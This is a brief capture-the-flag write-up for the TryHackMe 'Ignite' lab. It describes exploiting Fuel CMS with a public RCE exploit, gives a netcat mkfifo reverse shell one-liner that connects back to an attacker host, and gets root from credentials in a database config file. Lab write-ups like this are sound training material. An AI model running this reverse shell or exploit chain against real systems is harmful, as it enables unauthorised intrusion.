# TryHackMe Ignite

IP=10.10.122.235

nmap scan showed only one port open:
`80`

meaning there is a webpage there

Checking the webpage, it is obvious that it is a fuel cms website

`searchsploit fuel cms`

rce exploit for python2 was available and worked

created a reverse shell by `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <<IP>> 9999 >/tmp/f`

found the user flag at the home directory

Now the tricky part was getting the root flag. Initially I tried linpeas but that was extremely slow on this and I decided to skip that
I checked several proccesses if I could execute via root but not possible

then upon checking the site I saw it mentioned config files at a given directory

```
root
mememe
```
were in the database config file

and I found the root flag!
